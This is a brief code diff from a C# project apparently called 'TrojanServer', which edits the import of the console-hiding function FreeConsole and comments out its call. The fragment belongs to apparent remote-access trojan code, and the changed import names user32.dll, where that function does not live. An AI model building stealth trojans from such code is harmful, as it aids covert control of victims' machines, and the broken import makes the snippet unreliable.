@@ -13,7 +13,7 @@ namespace TrojanServer
     class Program
     {
         public static NetworkStream Reciever;
-        [DllImport("kernal32.dll")]
+        [DllImport("user32.dll")]
         public static extern bool FreeConsole();
 
         public static void Recieve()
@@ -125,7 +125,7 @@ namespace TrojanServer
 
 
 
-            FreeConsole();
+            //FreeConsole();
 
 
 
